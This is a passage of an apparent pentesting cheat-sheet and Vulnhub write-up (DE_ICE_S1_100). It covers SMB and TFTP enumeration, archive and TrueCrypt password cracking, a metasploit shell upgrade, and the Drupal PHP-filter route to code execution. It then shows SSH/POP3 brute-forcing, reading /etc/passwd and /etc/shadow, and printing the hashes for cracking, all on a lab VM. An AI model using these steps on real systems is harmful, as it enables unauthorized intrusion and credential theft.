</span><span class='line'>-L|&ndash;list This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don&rsquo;t match your TCP/IP DNS host names or if you are trying to reach a host on another network.</span></code></pre></td></tr></table></div></figure>
If you want to access the share you might want to type:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient \\IP\share_name
</span><span class='line'>
</span><span class='line'>So, in the above example, it would be
</span><span class='line'>
</span><span class='line'>smbclient \\192.168.1.2\kathy</span></code></pre></td></tr></table></div></figure>
If port 139 is open, also run enum4linux, may be it would help get the user list
</li>
<li>
curl
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   -k, &ndash;insecure
</span><span class='line'>          (SSL) This option explicitly allows curl to perform &ldquo;insecure&rdquo; SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
</span><span class='line'>          This makes all connections considered &ldquo;insecure&rdquo; fail unless -k, &ndash;insecure is used.
</span><span class='line'>
</span><span class='line'>   -I, &ndash;head
</span><span class='line'>          (HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size
</span><span class='line'>          and last modification time only.
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure></li>
<li>Port 69 UDP:
TFTP
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>get or put file</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>
Ruby Best way to get quoted words / phrases out of the text:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>text.scan(/&ldquo;([^&rdquo;]*)&ldquo;/)</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Convert all text in a file from UPPER to lowercase
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tr &lsquo;[:upper:]&rsquo; &lsquo;[:lower:]&rsquo; &lt; input.txt &gt; output.txt</span></code></pre></td></tr></table></div></figure>
Remove lines longer than x or shorter than x
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>awk &lsquo;length($0)&gt;x&rsquo; filename
</span><span class='line'>or
</span><span class='line'>awk &lsquo;length($0)&lt;x&rsquo; filename</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in Breach 2)), we can upgrade it to meterpreter by using sessions -u
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sessions -h
</span><span class='line'>Usage: sessions [options]
</span><span class='line'>
</span><span class='line'>Active session manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>## Tighten security after security incident
</span><span class='line'>## root never gets to log in remotely
</span><span class='line'>PermitRootLogin no
</span><span class='line'>## Eugene &amp; Margo can SSH in, no-one else allowed
</span><span class='line'>AllowUsers eugene margo
</span><span class='line'>## SSH keys only but margo can use a password
</span><span class='line'>Match user margo
</span><span class='line'>    PasswordAuthentication yes
</span><span class='line'>## End tighten security</span></code></pre></td></tr></table></div></figure></li>
<li>Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.</li>
<li>If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it&rsquo;s a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.933402 Probe Response (community) [1.0<em> 2.0</em> 5.5<em> 11.0</em> 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
</span><span class='line'>13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown)
</span><span class='line'>13:06:21.991250 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992274 Authentication (Open System)-1: Successful
</span><span class='line'>13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.992795 Authentication (Open System)-2:
</span><span class='line'>13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:21.994834 Assoc Request (community) [1.0<em> 2.0</em> 5.5<em> 11.0</em> 18.0 24.0 36.0 54.0 Mbit]
</span><span class='line'>13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
</span><span class='line'>13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
</span><span class='line'>13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0)
</span><span class='line'>13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
</span><span class='line'>13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
</span><span class='line'>13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
</span><span class='line'>13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown)
</span><span class='line'>13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
</span><span class='line'>13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown)
</span><span class='line'>13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown)
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
</span><span class='line'>13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station</span></code></pre></td></tr></table></div></figure>
</li>
<li>Transfer a image:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>base64 flair.jpg
</span><span class='line'>Copy output
</span><span class='line'>vi flair
</span><span class='line'>Paste the clipboard
</span><span class='line'>base64 -d flair &gt; flair.jpg</span></code></pre></td></tr></table></div></figure></li>
<li>It&rsquo;s always important to find, what&rsquo;s installed on the box:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg-query -l </span></code></pre></td></tr></table></div></figure>
or using wild cards
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg-query -l &lsquo;perl<em>&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>Password Protected File:
<ul>x
<li>
ZIP File: run fcrackzip
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip
</span><span class='line'>
</span><span class='line'>-D, &ndash;dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
</span><span class='line'>-p, &ndash;init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
</span><span class='line'>-u, &ndash;use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.</span></code></pre></td></tr></table></div></figure>
</li>
<li>
We can get the password hash of a password protected rar file by using rar2john
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root:~/Downloads]# rar2john crocs.rar
</span><span class='line'>file name: artwork.jpg
</span><span class='line'>crocs.rar:$RAR3$</em>1<em>35c0eaaed4c9efb9</em>463323be<em>140272</em>187245<em>0</em>crocs.rar<em>76</em>35:1::artwork.jpg</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>
<li>Data-URI: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs">https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs</a></li>
<li>We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -D localhost:9050 user@host
</span><span class='line'>
</span><span class='line'>     -D [bind_address:]port
</span><span class='line'>             Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection
</span><span class='line'>             is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5
</span><span class='line'>             protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified in the configuration file.
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>
and
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>proxychains4 remmina</span></code></pre></td></tr></table></div></figure></li>
<li>If you have sql-shell from sqlmap, we can use
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>select load_file(&lsquo;/etc/passwd&rsquo;);</span></code></pre></td></tr></table></div></figure>
</li>
<li>If you have a truecrypt volume to open and crack it&rsquo;s password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack &ndash;truecrypt &lt;Truecrypt File&gt; -k SHA512 -w &lt;Wordlist_File&gt;</span></code></pre></td></tr></table></div></figure>
and Veracrypt to open the file.</li>
<li>Getting a reverse shell from:</p>

<p>Drupal:</p>

<p>Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module.Once enabled we need to give permission to use it so in people -> permissions check &ldquo;Use the PHP code text format&rdquo;</p>

<p>Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down.</p>

<p>Taken from <a href="https://g0blin.co.uk/droopy-vulnhub-writeup/">https://g0blin.co.uk/droopy-vulnhub-writeup/</a></p>

<p>Drupal settings file location: /var/www/html/sites/default/settings.php</li></p>

<p><li>
If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.
</li>
</lu>
</ol>
</li></p>

<p><ol>
Write-Ups of Vulnhub VM:
<li><strong>DE_ICE_S1_100</strong>:</p>

<p>Scenario provided on Vulnhub: The scenario for this LiveCD is that a CEO of a small company has been pressured by the Board of Directors to have a penetration test done within the company. The CEO, believing his company is secure, feels this is a huge waste of money, especially since he already has a company scan their network for vulnerabilities (using nessus). To make the BoD happy, he decides to hire you for a 5-day job; and because he really doesn&rsquo;t believe the company is insecure, he has contracted you to look at only one server - a old system that only has a web-based list of the company&rsquo;s contact information.</p>

<p>The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.</p>

<p>Information provided on the webpage:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Here is a list of contact information for the various organizational bodies:
</span><span class='line'>FINANCIAL: For Problems with financial issues, please contact the HR Department:
</span><span class='line'>Head of HR: Marie Mary - <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x6d;&#x61;&#114;&#x79;&#109;&#64;&#104;&#x65;&#x72;&#111;&#116;&#46;&#110;&#x65;&#116;">&#109;&#x61;&#x72;&#x79;&#109;&#64;&#104;&#x65;&#114;&#111;&#x74;&#46;&#110;&#101;&#116;</a> (On Emergency Leave)
</span><span class='line'>Employee Pay: Pat Patrick - <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x70;&#97;&#116;&#x72;&#105;&#99;&#x6b;&#x70;&#64;&#104;&#x65;&#x72;&#x6f;&#x74;&#x2e;&#x6e;&#101;&#x74;">&#x70;&#x61;&#x74;&#114;&#105;&#x63;&#107;&#x70;&#64;&#x68;&#101;&#x72;&#x6f;&#x74;&#x2e;&#x6e;&#101;&#116;</a>
</span><span class='line'>Travel Comp: Terry Thompson - <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x74;&#x68;&#x6f;&#x6d;&#x70;&#x73;&#111;&#x6e;&#116;&#64;&#x68;&#101;&#x72;&#111;&#116;&#46;&#110;&#101;&#x74;">&#x74;&#x68;&#x6f;&#109;&#x70;&#115;&#111;&#x6e;&#116;&#64;&#x68;&#101;&#x72;&#x6f;&#116;&#46;&#110;&#x65;&#x74;</a>
</span><span class='line'>Benefits: Ben Benedict - <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#98;&#101;&#x6e;&#101;&#100;&#x69;&#x63;&#x74;&#x62;&#x40;&#x68;&#x65;&#114;&#x6f;&#x74;&#x2e;&#110;&#101;&#116;">&#98;&#x65;&#x6e;&#x65;&#100;&#105;&#99;&#x74;&#x62;&#64;&#104;&#101;&#114;&#111;&#x74;&#46;&#110;&#101;&#x74;</a>
</span><span class='line'>
</span><span class='line'>ENGINEERING: For the Engineering Department, we have the following information:
</span><span class='line'>Director of Engineering: Erin Gennieg - <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x67;&#101;&#110;&#110;&#105;&#101;&#x67;&#x65;&#x40;&#x68;&#101;&#114;&#111;&#x74;&#46;&#110;&#x65;&#116;">&#x67;&#101;&#110;&#x6e;&#x69;&#x65;&#x67;&#101;&#64;&#104;&#x65;&#114;&#111;&#116;&#46;&#x6e;&#101;&#x74;</a>
</span><span class='line'>Project Manager: Paul Michael - <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6d;&#x69;&#x63;&#x68;&#97;&#x65;&#108;&#x70;&#x40;&#104;&#101;&#114;&#x6f;&#116;&#46;&#x6e;&#x65;&#x74;">&#x6d;&#105;&#x63;&#104;&#97;&#101;&#108;&#112;&#x40;&#x68;&#101;&#x72;&#111;&#x74;&#x2e;&#x6e;&#x65;&#x74;</a>
</span><span class='line'>Engineer Lead: Ester Long - <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#108;&#x6f;&#110;&#x67;&#101;&#x40;&#x68;&#101;&#114;&#x6f;&#x74;&#x2e;&#x6e;&#x65;&#116;">&#108;&#x6f;&#x6e;&#103;&#x65;&#64;&#x68;&#101;&#114;&#x6f;&#x74;&#46;&#110;&#x65;&#x74;</a>
</span><span class='line'>
</span><span class='line'>If you have any problems with this server, or need to change information, please contact the following people:
</span><span class='line'>Sr. System Admin: Adam Adams - <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#97;&#x64;&#x61;&#x6d;&#115;&#97;&#x40;&#x68;&#101;&#x72;&#111;&#116;&#46;&#x6e;&#101;&#x74;">&#x61;&#100;&#x61;&#x6d;&#x73;&#x61;&#64;&#104;&#x65;&#x72;&#111;&#x74;&#46;&#110;&#101;&#116;</a>
</span><span class='line'>System Admin (Intern): Bob Banter - <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x62;&#97;&#x6e;&#x74;&#101;&#114;&#x62;&#64;&#104;&#101;&#x72;&#x6f;&#x74;&#46;&#x6e;&#x65;&#116;">&#98;&#x61;&#x6e;&#x74;&#x65;&#114;&#x62;&#x40;&#104;&#x65;&#114;&#111;&#116;&#x2e;&#x6e;&#x65;&#116;</a>
</span><span class='line'>System Admin: Chad Coffee - <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#99;&#x6f;&#x66;&#x66;&#101;&#101;&#x63;&#x40;&#x68;&#101;&#114;&#111;&#116;&#x2e;&#x6e;&#101;&#x74;">&#99;&#x6f;&#x66;&#x66;&#101;&#101;&#x63;&#x40;&#104;&#x65;&#x72;&#x6f;&#116;&#x2e;&#110;&#x65;&#116;</a></span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s see what we can find, so here we get a list of name of few people in the organization from Financial, Engineering department. We also get the people whom to contact if there&rsquo;s any problem with this server which is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Sr. System Admin: Adam Adams - <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x61;&#x64;&#x61;&#109;&#x73;&#x61;&#x40;&#x68;&#101;&#x72;&#111;&#x74;&#x2e;&#x6e;&#101;&#x74;">&#97;&#x64;&#x61;&#109;&#115;&#x61;&#64;&#104;&#101;&#114;&#111;&#116;&#x2e;&#x6e;&#101;&#116;</a>
</span><span class='line'>System Admin (Intern): Bob Banter - <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x62;&#x61;&#110;&#116;&#101;&#x72;&#98;&#64;&#104;&#x65;&#x72;&#111;&#x74;&#46;&#110;&#x65;&#116;">&#98;&#x61;&#110;&#x74;&#101;&#114;&#x62;&#x40;&#104;&#101;&#114;&#x6f;&#116;&#x2e;&#110;&#x65;&#x74;</a>
</span><span class='line'>System Admin: Chad Coffee - <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#x6f;&#102;&#102;&#101;&#101;&#99;&#64;&#x68;&#101;&#114;&#111;&#x74;&#x2e;&#x6e;&#x65;&#x74;">&#x63;&#111;&#x66;&#102;&#101;&#101;&#99;&#x40;&#104;&#x65;&#x72;&#x6f;&#116;&#46;&#110;&#x65;&#116;</a></span></code></pre></td></tr></table></div></figure>
Now, based on Name, usernames can be created using superkojiman namemash script. However, in this case there are lot of person and lot of possible username. So, we need to think who are important users which will be the System administrators. Also, by the concept of new people don&rsquo;t know much about security and might have default passwords. Let&rsquo;s target the intern Bob Banter.</p>

<p>Running superkojiman namemash script on Bob Banter, we get
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python namemash.py name
</span><span class='line'>bobbanter
</span><span class='line'>banterbob
</span><span class='line'>bob.banter
</span><span class='line'>banter.bob
</span><span class='line'>banterb
</span><span class='line'>bbanter
</span><span class='line'>bbob
</span><span class='line'>b.banter
</span><span class='line'>b.bob
</span><span class='line'>bob
</span><span class='line'>banter</span></code></pre></td></tr></table></div></figure>
Now Let&rsquo;s see what are the open ports on the host:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
</span><span class='line'>25/tcp  open   smtp?
</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
</span><span class='line'>110/tcp open   pop3     Openwall popa3d
</span><span class='line'>143/tcp open   imap     UW imapd 2004.357</span></code></pre></td></tr></table></div></figure>
Brute force attack can be executed on ssh and pop3. Running ssh brute force / pop3 brute results in
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.100  192.168.1.100  110/tcp (pop3)  bbanter  bbanter             Password
</span><span class='line'>192.168.1.100  192.168.1.100  22/tcp (ssh)    bbanter  bbanter             Password</span></code></pre></td></tr></table></div></figure></p>

<p>Logging in as a bbanter user and checking /etc/passwd and /etc/group file
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aadams:x:1000:10:,,,:/home/aadams:/bin/bash
</span><span class='line'>bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
</span><span class='line'>ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root::0:root
</span><span class='line'>wheel::10:root
</span><span class='line'>users::100:
</span><span class='line'>console::101:</span></code></pre></td></tr></table></div></figure>
We see found the actual usernames which can be brute forced, we also see that aadams is member of group 10 which is group named wheel.</p>

<p>So what&rsquo;s wheel group?
<ul>
<li>Control of su in PAM: If you want to protect su, so that only some people can use it to become root on your system, you need to add a new group &ldquo;wheel&rdquo; to your system (that is the cleanest way, since no file has such a group permission yet). Add root and the other users that should be able to su to the root user to this group. Then add the following line to /etc/pam.d/su:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   auth        requisite   pam_wheel.so group=wheel debug</span></code></pre></td></tr></table></div></figure>
This makes sure that only people from the group &ldquo;wheel&rdquo; can use su to become root. Other users will not be able to become root. In fact they will get a denied message if they try to become root</li>
</ul>
which essentially means we need to get password of aadams to become root. Other users (ccoffee or bbanter) won&rsquo;t be able to run su. Running the bruteforce attack on aadams, ccoffee by using rockyou/darkc0de, we get
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.100  192.168.1.100  110/tcp (pop3)  aadams   nostradamus         Password</span></code></pre></td></tr></table></div></figure>
Logging as aadams and using sudo, we can extract passwd and shadow file, combine them using unshadow and use john to crack it.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aadams@slax:~$ id
</span><span class='line'>uid=1000(aadams) gid=10(wheel) groups=10(wheel)
</span><span class='line'>aadams@slax:~$ sudo cat /etc/shadow
</span><span class='line'>root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
</span><span class='line'>aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
</span><span class='line'>bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
</span><span class='line'>ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unshadow PASSWD-FILE SHADOW FILE
</span><span class='line'>unshadow passwd shadow
